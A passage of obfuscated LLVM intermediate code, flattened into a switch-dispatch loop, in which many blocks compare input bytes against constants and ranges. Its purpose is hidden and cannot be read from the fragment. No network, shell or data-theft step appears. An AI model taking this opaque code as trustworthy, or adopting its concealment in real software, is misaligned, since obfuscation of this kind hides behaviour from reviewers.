  %819 = load i8, i8* %2, align 1
  %820 = zext i8 %819 to i32
  %821 = icmp eq i32 %820, 147
  %822 = select i1 %821, i32 1753870815, i32 677532394
  store i32 %822, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = load i8, i8* %3, align 1
  %825 = zext i8 %824 to i32
  %826 = icmp sge i32 %825, 103
  %827 = select i1 %826, i32 1313878273, i32 677532394
  store i32 %827, i32* %switchVar
  br label %loopEnd

; <label>:828:                                    ; preds = %loopEntry
  %829 = load i8, i8* %3, align 1
  %830 = zext i8 %829 to i32
  %831 = icmp slt i32 %830, 105
  %832 = select i1 %831, i32 1839754081, i32 677532394
  store i32 %832, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:833:                                    ; preds = %loopEntry
  %834 = load i8, i8* %2, align 1
  %835 = zext i8 %834 to i32
  %836 = icmp eq i32 %835, 147
  %837 = select i1 %836, i32 9099091, i32 -341202326
  store i32 %837, i32* %switchVar
  br label %loopEnd

; <label>:838:                                    ; preds = %loopEntry
  %839 = load i8, i8* %3, align 1
  %840 = zext i8 %839 to i32
  %841 = icmp sge i32 %840, 168
  %842 = select i1 %841, i32 -1453183615, i32 -341202326
  store i32 %842, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = load i8, i8* %3, align 1
  %845 = zext i8 %844 to i32
  %846 = icmp slt i32 %845, 170
  %847 = select i1 %846, i32 1839754081, i32 -341202326
  store i32 %847, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:848:                                    ; preds = %loopEntry
  %849 = load i8, i8* %2, align 1
  %850 = zext i8 %849 to i32
  %851 = icmp eq i32 %850, 147
  %852 = select i1 %851, i32 423164643, i32 -1890041907
  store i32 %852, i32* %switchVar
  br label %loopEnd

; <label>:853:                                    ; preds = %loopEntry
  %854 = load i8, i8* %3, align 1
  %855 = zext i8 %854 to i32
  %856 = icmp sge i32 %855, 198
  %857 = select i1 %856, i32 -635882924, i32 -1890041907
  store i32 %857, i32* %switchVar
  br label %loopEnd

; <label>:858:                                    ; preds = %loopEntry
  %859 = load i8, i8* %3, align 1
  %860 = zext i8 %859 to i32
  %861 = icmp slt i32 %860, 200
  %862 = select i1 %861, i32 1839754081, i32 -1890041907
  store i32 %862, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:863:                                    ; preds = %loopEntry
  %864 = load i8, i8* %2, align 1
  %865 = zext i8 %864 to i32
  %866 = icmp eq i32 %865, 147
  %867 = select i1 %866, i32 591412829, i32 328570711
  store i32 %867, i32* %switchVar
  br label %loopEnd

; <label>:868:                                    ; preds = %loopEntry
  %869 = load i8, i8* %3, align 1
  %870 = zext i8 %869 to i32
  %871 = icmp sge i32 %870, 238
  %872 = select i1 %871, i32 1832966508, i32 328570711
  store i32 %872, i32* %switchVar
  br label %loopEnd

; <label>:873:                                    ; preds = %loopEntry
  %874 = load i8, i8* %3, align 1
  %875 = zext i8 %874 to i32
  %876 = icmp slt i32 %875, 255
  %877 = select i1 %876, i32 1839754081, i32 328570711
  store i32 %877, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  %879 = load i8, i8* %2, align 1
  %880 = zext i8 %879 to i32
  %881 = icmp eq i32 %880, 150
  %882 = select i1 %881, i32 -1672925298, i32 -3695770
  store i32 %882, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  %884 = load i8, i8* %3, align 1
  %885 = zext i8 %884 to i32
  %886 = icmp sge i32 %885, 113
  %887 = select i1 %886, i32 467486671, i32 -3695770
  store i32 %887, i32* %switchVar
  br label %loopEnd

; <label>:888:                                    ; preds = %loopEntry
  %889 = load i8, i8* %3, align 1
  %890 = zext i8 %889 to i32
  %891 = icmp slt i32 %890, 115
  %892 = select i1 %891, i32 1839754081, i32 -3695770
  store i32 %892, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:893:                                    ; preds = %loopEntry
  %894 = load i8, i8* %2, align 1
  %895 = zext i8 %894 to i32
  %896 = icmp eq i32 %895, 152
  %897 = select i1 %896, i32 893972260, i32 1760726468
  store i32 %897, i32* %switchVar
  br label %loopEnd

; <label>:898:                                    ; preds = %loopEntry
  %899 = load i8, i8* %3, align 1
  %900 = zext i8 %899 to i32
  %901 = icmp sge i32 %900, 151
  %902 = select i1 %901, i32 1702646049, i32 1760726468
  store i32 %902, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  %904 = load i8, i8* %3, align 1
  %905 = zext i8 %904 to i32
  %906 = icmp slt i32 %905, 155
  %907 = select i1 %906, i32 1839754081, i32 1760726468
  store i32 %907, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:908:                                    ; preds = %loopEntry
  %909 = load i8, i8* %2, align 1
  %910 = zext i8 %909 to i32
  %911 = icmp eq i32 %910, 153
  %912 = select i1 %911, i32 65161229, i32 -836896996
  store i32 %912, i32* %switchVar
  br label %loopEnd

; <label>:913:                                    ; preds = %loopEntry
  %914 = load i8, i8* %3, align 1
  %915 = zext i8 %914 to i32
  %916 = icmp sge i32 %915, 21
  %917 = select i1 %916, i32 1145627033, i32 -836896996
  store i32 %917, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i8, i8* %3, align 1
  %920 = zext i8 %919 to i32
  %921 = icmp slt i32 %920, 32
  %922 = select i1 %921, i32 1839754081, i32 -836896996
  store i32 %922, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:923:                                    ; preds = %loopEntry
  %924 = load i8, i8* %2, align 1
  %925 = zext i8 %924 to i32
  %926 = icmp eq i32 %925, 155
  %927 = select i1 %926, i32 -65777847, i32 -941038200
  store i32 %927, i32* %switchVar
  br label %loopEnd

; <label>:928:                                    ; preds = %loopEntry
  %929 = load i8, i8* %3, align 1
  %930 = zext i8 %929 to i32
  %931 = icmp sge i32 %930, 5
  %932 = select i1 %931, i32 -439353268, i32 -941038200
  store i32 %932, i32* %switchVar
  br label %loopEnd

; <label>:933:                                    ; preds = %loopEntry
  %934 = load i8, i8* %3, align 1
  %935 = zext i8 %934 to i32
  %936 = icmp slt i32 %935, 10
  %937 = select i1 %936, i32 1839754081, i32 -941038200
  store i32 %937, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:938:                                    ; preds = %loopEntry
  %939 = load i8, i8* %2, align 1
  %940 = zext i8 %939 to i32
  %941 = icmp eq i32 %940, 155
  %942 = select i1 %941, i32 531144462, i32 -1626552757
  store i32 %942, i32* %switchVar
  br label %loopEnd

; <label>:943:                                    ; preds = %loopEntry
  %944 = load i8, i8* %3, align 1
  %945 = zext i8 %944 to i32
  %946 = icmp sge i32 %945, 74
  %947 = select i1 %946, i32 795057444, i32 -1626552757
  store i32 %947, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  %949 = load i8, i8* %3, align 1
  %950 = zext i8 %949 to i32
  %951 = icmp slt i32 %950, 89
  %952 = select i1 %951, i32 1839754081, i32 -1626552757
  store i32 %952, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:953:                                    ; preds = %loopEntry
  %954 = load i8, i8* %2, align 1
  %955 = zext i8 %954 to i32
  %956 = icmp eq i32 %955, 155
  %957 = select i1 %956, i32 -1947005270, i32 1130384658
  store i32 %957, i32* %switchVar
  br label %loopEnd

; <label>:958:                                    ; preds = %loopEntry
  %959 = load i8, i8* %3, align 1
  %960 = zext i8 %959 to i32
  %961 = icmp sge i32 %960, 213
  %962 = select i1 %961, i32 949707414, i32 1130384658
  store i32 %962, i32* %switchVar
  br label %loopEnd

; <label>:963:                                    ; preds = %loopEntry
  %964 = load i8, i8* %3, align 1
  %965 = zext i8 %964 to i32
  %966 = icmp slt i32 %965, 222
  %967 = select i1 %966, i32 1839754081, i32 1130384658
  store i32 %967, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:968:                                    ; preds = %loopEntry
  %969 = load i8, i8* %2, align 1
  %970 = zext i8 %969 to i32
  %971 = icmp eq i32 %970, 157
  %972 = select i1 %971, i32 1329150230, i32 -2044042098
  store i32 %972, i32* %switchVar
  br label %loopEnd

; <label>:973:                                    ; preds = %loopEntry
  %974 = load i8, i8* %3, align 1
  %975 = zext i8 %974 to i32
  %976 = icmp sge i32 %975, 150
  %977 = select i1 %976, i32 1507696622, i32 -2044042098
  store i32 %977, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  %979 = load i8, i8* %3, align 1
  %980 = zext i8 %979 to i32
  %981 = icmp slt i32 %980, 154
  %982 = select i1 %981, i32 1839754081, i32 -2044042098
  store i32 %982, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  %984 = load i8, i8* %2, align 1
  %985 = zext i8 %984 to i32
  %986 = icmp eq i32 %985, 158
  %987 = select i1 %986, i32 -1720913323, i32 1997618134
  store i32 %987, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  %989 = load i8, i8* %3, align 1
  %990 = zext i8 %989 to i32
  %991 = icmp sge i32 %990, 1
  %992 = select i1 %991, i32 1788645492, i32 1997618134
  store i32 %992, i32* %switchVar
  br label %loopEnd

; <label>:993:                                    ; preds = %loopEntry
  %994 = load i8, i8* %3, align 1
  %995 = zext i8 %994 to i32
  %996 = icmp slt i32 %995, 21
  %997 = select i1 %996, i32 1839754081, i32 1997618134
  store i32 %997, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:998:                                    ; preds = %loopEntry
  %999 = load i8, i8* %2, align 1
  %1000 = zext i8 %999 to i32
  %1001 = icmp eq i32 %1000, 158
  %1002 = select i1 %1001, i32 371596927, i32 145061273
  store i32 %1002, i32* %switchVar
  br label %loopEnd

; <label>:1003:                                   ; preds = %loopEntry
  %1004 = load i8, i8* %3, align 1
  %1005 = zext i8 %1004 to i32
  %1006 = icmp sge i32 %1005, 235
  %1007 = select i1 %1006, i32 284323264, i32 145061273
  store i32 %1007, i32* %switchVar
  br label %loopEnd

; <label>:1008:                                   ; preds = %loopEntry
  %1009 = load i8, i8* %3, align 1
  %1010 = zext i8 %1009 to i32
  %1011 = icmp slt i32 %1010, 247
  %1012 = select i1 %1011, i32 1839754081, i32 145061273
  store i32 %1012, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1013:                                   ; preds = %loopEntry
  %1014 = load i8, i8* %2, align 1
  %1015 = zext i8 %1014 to i32
  %1016 = icmp eq i32 %1015, 159
  %1017 = select i1 %1016, i32 133578025, i32 2080404242
  store i32 %1017, i32* %switchVar
  br label %loopEnd

; <label>:1018:                                   ; preds = %loopEntry
  %1019 = load i8, i8* %3, align 1
  %1020 = zext i8 %1019 to i32
  %1021 = icmp sge i32 %1020, 120
  %1022 = select i1 %1021, i32 -934423371, i32 2080404242
  store i32 %1022, i32* %switchVar
  br label %loopEnd

; <label>:1023:                                   ; preds = %loopEntry
  %1024 = load i8, i8* %3, align 1
  %1025 = zext i8 %1024 to i32
  %1026 = icmp slt i32 %1025, 121
  %1027 = select i1 %1026, i32 1839754081, i32 2080404242
  store i32 %1027, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1028:                                   ; preds = %loopEntry
  %1029 = load i8, i8* %2, align 1
  %1030 = zext i8 %1029 to i32
  %1031 = icmp eq i32 %1030, 160
  %1032 = select i1 %1031, i32 -1882962303, i32 -1840561514
  store i32 %1032, i32* %switchVar
  br label %loopEnd

; <label>:1033:                                   ; preds = %loopEntry
  %1034 = load i8, i8* %3, align 1
  %1035 = zext i8 %1034 to i32
  %1036 = icmp sge i32 %1035, 132
  %1037 = select i1 %1036, i32 589019583, i32 -1840561514
  store i32 %1037, i32* %switchVar
  br label %loopEnd

; <label>:1038:                                   ; preds = %loopEntry
  %1039 = load i8, i8* %3, align 1
  %1040 = zext i8 %1039 to i32
  %1041 = icmp slt i32 %1040, 151
  %1042 = select i1 %1041, i32 1839754081, i32 -1840561514
  store i32 %1042, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1043:                                   ; preds = %loopEntry
  %1044 = load i8, i8* %2, align 1
  %1045 = zext i8 %1044 to i32
  %1046 = icmp eq i32 %1045, 64
  %1047 = select i1 %1046, i32 137791144, i32 -1152922171
  store i32 %1047, i32* %switchVar
  br label %loopEnd

; <label>:1048:                                   ; preds = %loopEntry
  %1049 = load i8, i8* %3, align 1
  %1050 = zext i8 %1049 to i32
  %1051 = icmp sge i32 %1050, 224
  %1052 = select i1 %1051, i32 2132994741, i32 -1152922171
  store i32 %1052, i32* %switchVar
  br label %loopEnd

; <label>:1053:                                   ; preds = %loopEntry
  %1054 = load i8, i8* %3, align 1
  %1055 = zext i8 %1054 to i32
  %1056 = icmp slt i32 %1055, 227
  %1057 = select i1 %1056, i32 1839754081, i32 -1152922171
  store i32 %1057, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1058:                                   ; preds = %loopEntry
  %1059 = load i8, i8* %2, align 1
  %1060 = zext i8 %1059 to i32
  %1061 = icmp eq i32 %1060, 162
  %1062 = select i1 %1061, i32 219428119, i32 -389312207
  store i32 %1062, i32* %switchVar
  br label %loopEnd

; <label>:1063:                                   ; preds = %loopEntry
  %1064 = load i8, i8* %3, align 1
  %1065 = zext i8 %1064 to i32
  %1066 = icmp sge i32 %1065, 45
  %1067 = select i1 %1066, i32 1197455952, i32 -389312207
  store i32 %1067, i32* %switchVar
  br label %loopEnd

; <label>:1068:                                   ; preds = %loopEntry
  %1069 = load i8, i8* %3, align 1
  %1070 = zext i8 %1069 to i32
  %1071 = icmp slt i32 %1070, 47
  %1072 = select i1 %1071, i32 1839754081, i32 -389312207
  store i32 %1072, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1073:                                   ; preds = %loopEntry
  %1074 = load i8, i8* %2, align 1
  %1075 = zext i8 %1074 to i32
  %1076 = icmp eq i32 %1075, 163
  %1077 = select i1 %1076, i32 279686411, i32 -1707377023
  store i32 %1077, i32* %switchVar
  br label %loopEnd

; <label>:1078:                                   ; preds = %loopEntry
  %1079 = load i8, i8* %3, align 1
  %1080 = zext i8 %1079 to i32
  %1081 = icmp sge i32 %1080, 205
  %1082 = select i1 %1081, i32 921387261, i32 -1707377023
  store i32 %1082, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  %1084 = load i8, i8* %3, align 1
  %1085 = zext i8 %1084 to i32
  %1086 = icmp slt i32 %1085, 207
  %1087 = select i1 %1086, i32 1839754081, i32 -1707377023
  store i32 %1087, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1088:                                   ; preds = %loopEntry
  %1089 = load i8, i8* %2, align 1
  %1090 = zext i8 %1089 to i32
  %1091 = icmp eq i32 %1090, 164
  %1092 = select i1 %1091, i32 1032414070, i32 -1424695597
  store i32 %1092, i32* %switchVar
  br label %loopEnd

; <label>:1093:                                   ; preds = %loopEntry
  %1094 = load i8, i8* %3, align 1
  %1095 = zext i8 %1094 to i32
  %1096 = icmp sge i32 %1095, 45
  %1097 = select i1 %1096, i32 -365539860, i32 -1424695597
  store i32 %1097, i32* %switchVar
  br label %loopEnd

; <label>:1098:                                   ; preds = %loopEntry
  %1099 = load i8, i8* %3, align 1
  %1100 = zext i8 %1099 to i32
  %1101 = icmp slt i32 %1100, 50
  %1102 = select i1 %1101, i32 1839754081, i32 -1424695597
  store i32 %1102, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1103:                                   ; preds = %loopEntry
  %1104 = load i8, i8* %2, align 1
  %1105 = zext i8 %1104 to i32
  %1106 = icmp eq i32 %1105, 164
  %1107 = select i1 %1106, i32 1927953731, i32 1417458216
  store i32 %1107, i32* %switchVar
  br label %loopEnd

; <label>:1108:                                   ; preds = %loopEntry
  %1109 = load i8, i8* %3, align 1
  %1110 = zext i8 %1109 to i32
  %1111 = icmp sge i32 %1110, 217
  %1112 = select i1 %1111, i32 -1440536095, i32 1417458216
  store i32 %1112, i32* %switchVar
  br label %loopEnd

; <label>:1113:                                   ; preds = %loopEntry
  %1114 = load i8, i8* %3, align 1
  %1115 = zext i8 %1114 to i32
  %1116 = icmp slt i32 %1115, 233
  %1117 = select i1 %1116, i32 1839754081, i32 1417458216
  store i32 %1117, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1118:                                   ; preds = %loopEntry
  %1119 = load i8, i8* %2, align 1
  %1120 = zext i8 %1119 to i32
  %1121 = icmp eq i32 %1120, 169
  %1122 = select i1 %1121, i32 -579897745, i32 -1803893924
  store i32 %1122, i32* %switchVar
  br label %loopEnd

; <label>:1123:                                   ; preds = %loopEntry
  %1124 = load i8, i8* %3, align 1
  %1125 = zext i8 %1124 to i32
  %1126 = icmp sge i32 %1125, 252
  %1127 = select i1 %1126, i32 1407972868, i32 -1803893924
  store i32 %1127, i32* %switchVar
  br label %loopEnd

; <label>:1128:                                   ; preds = %loopEntry
  %1129 = load i8, i8* %3, align 1
  %1130 = zext i8 %1129 to i32
  %1131 = icmp slt i32 %1130, 254
  %1132 = select i1 %1131, i32 1839754081, i32 -1803893924
  store i32 %1132, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1133:                                   ; preds = %loopEntry
  %1134 = load i8, i8* %2, align 1
  %1135 = zext i8 %1134 to i32
  %1136 = icmp eq i32 %1135, 199
  %1137 = select i1 %1136, i32 1540904400, i32 54843668
  store i32 %1137, i32* %switchVar
  br label %loopEnd

; <label>:1138:                                   ; preds = %loopEntry
  %1139 = load i8, i8* %3, align 1
  %1140 = zext i8 %1139 to i32
  %1141 = icmp sge i32 %1140, 121
  %1142 = select i1 %1141, i32 -563211748, i32 54843668
  store i32 %1142, i32* %switchVar
  br label %loopEnd

; <label>:1143:                                   ; preds = %loopEntry
  %1144 = load i8, i8* %3, align 1
  %1145 = zext i8 %1144 to i32
  %1146 = icmp slt i32 %1145, 254
  %1147 = select i1 %1146, i32 1839754081, i32 54843668
  store i32 %1147, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1148:                                   ; preds = %loopEntry
  %1149 = load i8, i8* %2, align 1
  %1150 = zext i8 %1149 to i32
  %1151 = icmp eq i32 %1150, 205
  %1152 = select i1 %1151, i32 -733316293, i32 -1252950198
  store i32 %1152, i32* %switchVar
  br label %loopEnd

; <label>:1153:                                   ; preds = %loopEntry
  %1154 = load i8, i8* %3, align 1
  %1155 = zext i8 %1154 to i32
  %1156 = icmp sge i32 %1155, 1
  %1157 = select i1 %1156, i32 -273650039, i32 -1252950198
  store i32 %1157, i32* %switchVar
  br label %loopEnd

; <label>:1158:                                   ; preds = %loopEntry
  %1159 = load i8, i8* %3, align 1
  %1160 = zext i8 %1159 to i32
  %1161 = icmp slt i32 %1160, 118
  %1162 = select i1 %1161, i32 1839754081, i32 -1252950198
  store i32 %1162, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1163:                                   ; preds = %loopEntry
  %1164 = load i8, i8* %2, align 1
  %1165 = zext i8 %1164 to i32
  %1166 = icmp eq i32 %1165, 207
  %1167 = select i1 %1166, i32 -908305144, i32 -364519820
  store i32 %1167, i32* %switchVar
  br label %loopEnd

; <label>:1168:                                   ; preds = %loopEntry
  %1169 = load i8, i8* %3, align 1
  %1170 = zext i8 %1169 to i32
  %1171 = icmp sge i32 %1170, 60
  %1172 = select i1 %1171, i32 -1649768052, i32 -364519820
  store i32 %1172, i32* %switchVar
  br label %loopEnd

; <label>:1173:                                   ; preds = %loopEntry
  %1174 = load i8, i8* %3, align 1
  %1175 = zext i8 %1174 to i32
  %1176 = icmp slt i32 %1175, 62
  %1177 = select i1 %1176, i32 1839754081, i32 -364519820
  store i32 %1177, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1178:                                   ; preds = %loopEntry
  %1179 = load i8, i8* %2, align 1
  %1180 = zext i8 %1179 to i32
  %1181 = icmp eq i32 %1180, 104
  %1182 = select i1 %1181, i32 1953579265, i32 558476829
  store i32 %1182, i32* %switchVar
  br label %loopEnd

; <label>:1183:                                   ; preds = %loopEntry
  %1184 = load i8, i8* %3, align 1
  %1185 = zext i8 %1184 to i32
  %1186 = icmp sge i32 %1185, 16
  %1187 = select i1 %1186, i32 -1161576905, i32 558476829
  store i32 %1187, i32* %switchVar
  br label %loopEnd

; <label>:1188:                                   ; preds = %loopEntry
  %1189 = load i8, i8* %3, align 1
  %1190 = zext i8 %1189 to i32
  %1191 = icmp slt i32 %1190, 31
  %1192 = select i1 %1191, i32 1839754081, i32 558476829
  store i32 %1192, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1193:                                   ; preds = %loopEntry
  %1194 = load i8, i8* %2, align 1
  %1195 = zext i8 %1194 to i32
  %1196 = icmp eq i32 %1195, 188
  %1197 = select i1 %1196, i32 -721253711, i32 -2058194110
  store i32 %1197, i32* %switchVar
  br label %loopEnd

; <label>:1198:                                   ; preds = %loopEntry
  %1199 = load i8, i8* %3, align 1
  %1200 = zext i8 %1199 to i32
  %1201 = icmp eq i32 %1200, 166
  %1202 = select i1 %1201, i32 1839754081, i32 -2058194110
  store i32 %1202, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1203:                                   ; preds = %loopEntry
  %1204 = load i8, i8* %2, align 1
  %1205 = zext i8 %1204 to i32
  %1206 = icmp eq i32 %1205, 188
  %1207 = select i1 %1206, i32 -2102423558, i32 -860629753
  store i32 %1207, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  %1209 = load i8, i8* %3, align 1
  %1210 = zext i8 %1209 to i32
  %1211 = icmp eq i32 %1210, 226
  %1212 = select i1 %1211, i32 1839754081, i32 -860629753
  store i32 %1212, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1213:                                   ; preds = %loopEntry
  %1214 = load i8, i8* %2, align 1
  %1215 = zext i8 %1214 to i32
  %1216 = icmp eq i32 %1215, 159
  %1217 = select i1 %1216, i32 -719864651, i32 -1439564051
  store i32 %1217, i32* %switchVar
  br label %loopEnd

; <label>:1218:                                   ; preds = %loopEntry
  %1219 = load i8, i8* %3, align 1
  %1220 = zext i8 %1219 to i32
  %1221 = icmp eq i32 %1220, 203
  %1222 = select i1 %1221, i32 1839754081, i32 -1439564051
  store i32 %1222, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1223:                                   ; preds = %loopEntry
  %1224 = load i8, i8* %2, align 1
  %1225 = zext i8 %1224 to i32
  %1226 = icmp eq i32 %1225, 162
  %1227 = select i1 %1226, i32 1384385193, i32 604519194
  store i32 %1227, i32* %switchVar
  br label %loopEnd

; <label>:1228:                                   ; preds = %loopEntry
  %1229 = load i8, i8* %3, align 1
  %1230 = zext i8 %1229 to i32
  %1231 = icmp eq i32 %1230, 243
  %1232 = select i1 %1231, i32 1839754081, i32 604519194
  store i32 %1232, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1233:                                   ; preds = %loopEntry
  %1234 = load i8, i8* %2, align 1
  %1235 = zext i8 %1234 to i32
  %1236 = icmp eq i32 %1235, 45
  %1237 = select i1 %1236, i32 -1889640755, i32 1492607409
  store i32 %1237, i32* %switchVar
  br label %loopEnd

; <label>:1238:                                   ; preds = %loopEntry
  %1239 = load i8, i8* %3, align 1
  %1240 = zext i8 %1239 to i32
  %1241 = icmp eq i32 %1240, 55
  %1242 = select i1 %1241, i32 1839754081, i32 1492607409
  store i32 %1242, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1243:                                   ; preds = %loopEntry
  %1244 = load i8, i8* %2, align 1
  %1245 = zext i8 %1244 to i32
  %1246 = icmp eq i32 %1245, 178
  %1247 = select i1 %1246, i32 1898282312, i32 1126886985
  store i32 %1247, i32* %switchVar
  br label %loopEnd

; <label>:1248:                                   ; preds = %loopEntry
  %1249 = load i8, i8* %3, align 1
  %1250 = zext i8 %1249 to i32
  %1251 = icmp eq i32 %1250, 62
  %1252 = select i1 %1251, i32 1839754081, i32 1126886985
  store i32 %1252, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1253:                                   ; preds = %loopEntry
  %1254 = load i8, i8* %2, align 1
  %1255 = zext i8 %1254 to i32
  %1256 = icmp eq i32 %1255, 104
  %1257 = select i1 %1256, i32 1242037602, i32 1414585896
  store i32 %1257, i32* %switchVar
  br label %loopEnd

; <label>:1258:                                   ; preds = %loopEntry
  %1259 = load i8, i8* %3, align 1
  %1260 = zext i8 %1259 to i32
  %1261 = icmp eq i32 %1260, 131
  %1262 = select i1 %1261, i32 1839754081, i32 1414585896
  store i32 %1262, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1263:                                   ; preds = %loopEntry
  %1264 = load i8, i8* %2, align 1
  %1265 = zext i8 %1264 to i32
  %1266 = icmp eq i32 %1265, 104
  %1267 = select i1 %1266, i32 -1598209106, i32 1162741723
  store i32 %1267, i32* %switchVar
  br label %loopEnd

; <label>:1268:                                   ; preds = %loopEntry
  %1269 = load i8, i8* %3, align 1
  %1270 = zext i8 %1269 to i32
  %1271 = icmp eq i32 %1270, 236
  %1272 = select i1 %1271, i32 1839754081, i32 1162741723
  store i32 %1272, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1273:                                   ; preds = %loopEntry
  %1274 = load i8, i8* %2, align 1
  %1275 = zext i8 %1274 to i32
  %1276 = icmp eq i32 %1275, 107
  %1277 = select i1 %1276, i32 -2106027447, i32 87002838
  store i32 %1277, i32* %switchVar
  br label %loopEnd

; <label>:1278:                                   ; preds = %loopEntry
  %1279 = load i8, i8* %3, align 1
  %1280 = zext i8 %1279 to i32
  %1281 = icmp eq i32 %1280, 170
  %1282 = select i1 %1281, i32 1839754081, i32 87002838
  store i32 %1282, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1283:                                   ; preds = %loopEntry
  %1284 = load i8, i8* %2, align 1
  %1285 = zext i8 %1284 to i32
  %1286 = icmp eq i32 %1285, 138
  %1287 = select i1 %1286, i32 1501729156, i32 -388379543
  store i32 %1287, i32* %switchVar
  br label %loopEnd

; <label>:1288:                                   ; preds = %loopEntry
  %1289 = load i8, i8* %3, align 1
  %1290 = zext i8 %1289 to i32
  %1291 = icmp eq i32 %1290, 197
  %1292 = select i1 %1291, i32 1839754081, i32 -388379543
  store i32 %1292, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1293:                                   ; preds = %loopEntry
  %1294 = load i8, i8* %2, align 1
  %1295 = zext i8 %1294 to i32
  %1296 = icmp eq i32 %1295, 138
  %1297 = select i1 %1296, i32 -659610755, i32 1719145220
  store i32 %1297, i32* %switchVar
  br label %loopEnd

; <label>:1298:                                   ; preds = %loopEntry
  %1299 = load i8, i8* %3, align 1
  %1300 = zext i8 %1299 to i32
  %1301 = icmp eq i32 %1300, 68
  %1302 = select i1 %1301, i32 1839754081, i32 1719145220
  store i32 %1302, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1303:                                   ; preds = %loopEntry
  %1304 = load i8, i8* %2, align 1
  %1305 = zext i8 %1304 to i32
  %1306 = icmp eq i32 %1305, 139
  %1307 = select i1 %1306, i32 -450244743, i32 -561546902
  store i32 %1307, i32* %switchVar
  br label %loopEnd

; <label>:1308:                                   ; preds = %loopEntry
  %1309 = load i8, i8* %3, align 1
  %1310 = zext i8 %1309 to i32
  %1311 = icmp eq i32 %1310, 59
  %1312 = select i1 %1311, i32 1839754081, i32 -561546902
  store i32 %1312, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1313:                                   ; preds = %loopEntry
  %1314 = load i8, i8* %2, align 1
  %1315 = zext i8 %1314 to i32
  %1316 = icmp eq i32 %1315, 146
  %1317 = select i1 %1316, i32 268362610, i32 1520112040
  store i32 %1317, i32* %switchVar
  br label %loopEnd

; <label>:1318:                                   ; preds = %loopEntry
  %1319 = load i8, i8* %3, align 1
  %1320 = zext i8 %1319 to i32
  %1321 = icmp eq i32 %1320, 185
  %1322 = select i1 %1321, i32 -1148487790, i32 1520112040
  store i32 %1322, i32* %switchVar
  br label %loopEnd

; <label>:1323:                                   ; preds = %loopEntry
  %1324 = load i8, i8* %4, align 1
  %1325 = zext i8 %1324 to i32
  %1326 = icmp sge i32 %1325, 128
  %1327 = select i1 %1326, i32 -2019620684, i32 1520112040
  store i32 %1327, i32* %switchVar
  br label %loopEnd

; <label>:1328:                                   ; preds = %loopEntry
  %1329 = load i8, i8* %4, align 1
  %1330 = zext i8 %1329 to i32
  %1331 = icmp slt i32 %1330, 191
  %1332 = select i1 %1331, i32 1839754081, i32 1520112040
  store i32 %1332, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1333:                                   ; preds = %loopEntry
  %1334 = load i8, i8* %2, align 1
  %1335 = zext i8 %1334 to i32
  %1336 = icmp eq i32 %1335, 163
  %1337 = select i1 %1336, i32 -123035818, i32 50097348
  store i32 %1337, i32* %switchVar
